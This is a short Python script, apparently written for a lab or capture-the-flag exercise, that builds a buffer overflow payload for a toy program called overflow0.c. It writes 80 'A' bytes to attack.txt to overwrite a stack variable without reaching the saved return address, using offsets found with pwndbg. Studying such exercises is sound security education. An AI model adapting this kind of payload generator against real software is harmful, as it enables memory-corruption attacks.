#!/usr/bin/env python3
"""
Buffer Overflow Payload Generator
Target: overflow0.c
Goal: Overwrite 'not_overflow' variable without corrupting the saved RIP.
"""

def create_payload(filename="attack.txt", target_length=80):
    # The character 'A' in hexadecimal is 0x41.
    # Any character other than 'Y' (0x59) will work to bypass the if statement.
    padding_char = "A"
    
    print(f"[*] Generating payload of {target_length} bytes...")
    
    # Let's create the payload string
    payload = padding_char * target_length
    
    # We write the payload to the file
    try:
        with open(filename, "w") as f:
            f.write(payload)
        print(f"[+] Success! Payload written to '{filename}'.")
        print(f"    Run in GDB: run < {filename}")
    except IOError as e:
        print(f"[-] Error writing to file: {e}")

if __name__ == "__main__":
    # According to our memory analysis (PwnDbg):
    # Offset for 'not_overflow' = 75 bytes.
    # Offset for 'saved RIP' = 88 bytes.
    # A payload between 76 and 87 bytes is our surgical "sweet spot."
    SAFE_OFFSET = 80 
    
    create_payload(target_length=SAFE_OFFSET)